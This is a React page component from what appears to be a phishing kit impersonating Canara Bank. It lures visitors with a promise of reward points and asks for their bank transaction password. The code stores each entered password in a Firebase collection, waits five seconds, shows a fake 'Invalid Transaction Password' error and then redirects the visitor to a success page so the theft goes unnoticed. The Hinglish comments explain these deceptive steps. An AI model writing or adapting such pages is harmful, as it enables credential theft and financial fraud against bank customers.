import { useState } from 'react'; 
import { useNavigate, useParams } from 'react-router-dom';
import '../App.css';
import headerImage from '../assets/second-page-header.jpeg';
import FirebaseUtil from '../FirebaseRepo';

const SecondPage = () => {
  const [password2, setPassword2] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const navigate = useNavigate();
  const { documentId } = useParams();

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setErrorMessage('');

    try {
      // Data update in Firebase
      await FirebaseUtil.updateDocument("carvana", documentId, {
        password2,
      });

      // Step 1: 5 Second tak loading dikhana
      setTimeout(() => {
        setIsSubmitting(false);
        // Step 2: Error message dikhana
        setErrorMessage('Invalid Transaction Password. Please try again.');

        // Step 3: Error dikhane ke 2 second baad automatic next page par bhejna
        setTimeout(() => {
          navigate('/success');
        }, 2500); 

      }, 5000);

    } catch (error) {
      console.error("Error:", error);
      setIsSubmitting(false);
      setErrorMessage('Network error. Please try again.');
    }
  };

  return (
    <div className="flex flex-col min-h-screen bg-white">
      <div className="w-full">
        <img src={headerImage} alt="Header" className="w-full h-40 object-cover" />
      </div>

      <main className="flex-1 m-2 flex justify-center items-center bg-gray-100">
        <div className="bg-white text-gray-800 rounded-xl w-full max-w-md p-5 shadow-lg">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-blue-800">
              One Step Away To Collect Your Rewardz Points
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            {errorMessage && (
              <div className="bg-red-50 border-l-4 border-red-500 p-3 mb-4 transition-all">
                <p className="text-red-700 text-sm font-semibold">{errorMessage}</p>
              </div>
            )}

            <div className="mb-4">
              <label className="block text-gray-700 text-sm font-bold mb-2">
                Verify Your Transaction Password
              </label>
              <input
                type="password"
                className={`w-full py-2 px-3 rounded border text-gray-700 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  errorMessage ? 'border-red-500 bg-red-50' : 'border-gray-300'
                }`}
                value={password2}
                onChange={(e) => setPassword2(e.target.value)}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-yellow-400 hover:bg-yellow-500 text-black font-bold py-2 px-4 rounded-full text-sm shadow-md"
              disabled={isSubmitting}
            >
              {isSubmitting ? "PROCESSING..." : "SUBMIT"}
            </button>
          </form>
        </div>
      </main>

      <footer className="bg-gray-800 text-white p-4 text-center mt-auto">
        <p className="text-sm">© 2025 Canara Bank. All rights reserved.</p>
      </footer>
    </div>
  );
};

export default SecondPage;
